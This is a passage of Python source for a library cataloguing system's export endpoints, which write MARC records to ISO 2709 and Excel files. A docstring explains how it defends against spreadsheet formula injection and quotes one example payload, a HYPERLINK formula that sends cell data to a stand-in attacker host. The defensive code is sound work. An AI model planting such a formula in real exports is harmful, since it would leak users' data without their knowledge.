                    data = record_to_iso(rec, encoding=payload.encoding)
                except MarcWriteError:
                    skipped += 1
                    continue
                out.write(data)
                count += 1
        headers = {"X-Count": str(count)}
        if skipped:
            headers["X-Skipped"] = str(skipped)
        if mapping or const:
            headers["X-Preset"] = payload.preset_id or ""
            headers["X-Mapped"] = str(mapped)
        return headers

    return _temporary_export(".iso", "records.iso", "application/octet-stream", write)


def _as_text_cell(ws, value):
    """把可能被表格软件当成公式的值钉成**文本单元格**。

    ## 为什么导出也要防注入

    openpyxl 在 `value` 以 `=` `+` `-` `@` 开头时会自动判定为公式
    （`data_type='f'`），不做任何转义。而这些列（题名、第一责任者、提要）的值
    来自 MARC 字段，MARC 的主要来源是**外部套录 / ISO 导入**——不完全受信的
    第三方数据。一条题名写成 `=HYPERLINK("http://attacker/?d="&A1,"点我")` 的
    书目，就足以让馆员在打开导出文件时把整表数据外发，或者触发 DDE 类执行。

    ## 为什么不用「前置单引号」这个常见做法

    前置单引号会把 `'` 变成单元格内容的一部分（实测读回是 `'=1+1`），
    导出文件里能看见一个多余的撇号。这里改为**只把单元格类型钉成字符串**：
    数据一字不改，Excel 打开显示原文，但不会求值。实测 `data_type` 由 `f`
    变为 `s`，值保持 `=1+1`。
    """
    from openpyxl.cell.cell import Cell

    text = "" if value is None else str(value)
    if text[:1] in ("=", "+", "-", "@", "\t", "\r"):
        cell = Cell(ws, row=0, column=1, value=text)
        cell.data_type = "s"          # 覆盖 openpyxl 的公式判定
        return cell
    return text


def _write_export_excel(path: str, records: Iterator, title: str,
                        *, with_shelf: bool = False) -> dict:
    import openpyxl
    from ..services import orm_to_record

    columns = _export_columns(with_shelf)
    wb = openpyxl.Workbook(write_only=True)
    ws = wb.create_sheet(title)
    count = 0
    try:
        ws.append([c[0] for c in columns])
        with closing(records) as rows:
            for orm in rows:
                rec = orm_to_record(orm)
                row = []
                for _name, tag, code in columns:
                    if tag == "001":
                        row.append(rec.control_value("001") or "")
                    elif tag == "606":
                        row.append("；".join(rec.all_values(tag, code)))
                    elif tag == SHELF_TAG:
                        # 记录列是权威值；905$c 是建馆藏时按它重建出来的，
                        # 老记录/无馆藏的记录可能只有一边有值，所以兜底读一次。
                        row.append(getattr(orm, "shelf_no", None)
                                   or rec.first_value("905", "c") or "")
                    else:
                        row.append(rec.first_value(tag, code) or "")
                ws.append([_as_text_cell(ws, v) for v in row])
                count += 1
        wb.save(path)
        return {"X-Count": str(count)}
    finally:
        # openpyxl write_only 的工作表 XML 也落临时文件；save 前异常时需一并清理。
        try:
            if not ws.closed:
                ws.close()
        finally:
            writer = ws._writer
            if writer is not None and os.path.exists(writer.out):
                writer.cleanup()
            wb.close()


@export_router.post("/excel")
@api(module="io")
def export_excel(payload: ExportIn, db: Session = Depends(get_db)):
    """按 id 批量导出标准 Excel 模板（列定义见）；
    不给 id 而给 `library_id` 时**整库导出**。"""
    return _temporary_export(
        ".xlsx", "records.xlsx",
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        lambda path: _write_export_excel(
            path, _export_records(db, payload), "书目",
            with_shelf=_has_shelf_no(db, RecordORM, payload, "图书库")))


class ResourceExportIn(BaseModel):
    ids: list[int] = []
    encoding: str = "gbk"
    # ids 为空时按资源库**整库导出**；都不给 → 400（不静默导空文件）。
    library_id: int | None = None


def _export_resource_records(db: Session, payload: "ResourceExportIn") -> Iterator:
    from ..models import ResourceRecordORM
    return _iter_export_records(db, ResourceRecordORM, payload, "资源库")


@export_router.post("/resource-iso")
@api(module="io")
def export_resource_iso(payload: ResourceExportIn, db: Session = Depends(get_db)):
    """导出**资源库**记录的 ISO 2709（原料原样，便于备份 / 迁移 / 换个库再套录）。

    数据源是资源库记录（含 9xx 私有字段），与图书库导出同一套写法；勾选 `ids` 或给
    `library_id` 整库导出，都不给 → 400。
    """
    from ..core.marc import record_to_iso
    from ..services import orm_to_record

    def write(path: str) -> dict:
        count = skipped = 0
        with open(path, "wb") as out, closing(_export_resource_records(db, payload)) as rows:
            for orm in rows:
                try:
                    data = record_to_iso(orm_to_record(orm), encoding=payload.encoding)
                except MarcWriteError:
                    skipped += 1
                    continue
                out.write(data)
                count += 1
        headers = {"X-Count": str(count)}
        if skipped:
            headers["X-Skipped"] = str(skipped)
        return headers

    return _temporary_export(".iso", "resource-records.iso", "application/octet-stream", write)


@export_router.post("/resource-excel")
@api(module="io")
def export_resource_excel(payload: ResourceExportIn, db: Session = Depends(get_db)):
    """导出**资源库**记录的标准 Excel（列定义同图书库导出，见）。"""
    return _temporary_export(
        ".xlsx", "resource-records.xlsx",
        "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        lambda path: _write_export_excel(
            path, _export_resource_records(db, payload), "资源库书目",
            # 资源库记录是纯书目，没有排架号这一列
            with_shelf=False))
